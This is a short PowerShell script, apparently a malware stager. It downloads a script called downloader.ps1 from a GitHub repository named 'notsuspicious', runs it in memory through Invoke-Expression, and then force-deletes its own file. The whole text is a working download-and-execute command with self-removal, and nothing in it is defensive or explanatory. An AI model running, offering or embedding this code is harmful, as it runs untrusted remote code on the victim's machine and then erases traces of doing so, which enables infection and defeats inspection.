#._.
Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content

# Remove the current script file
Remove-Item $MyInvocation.MyCommand.Path -Force
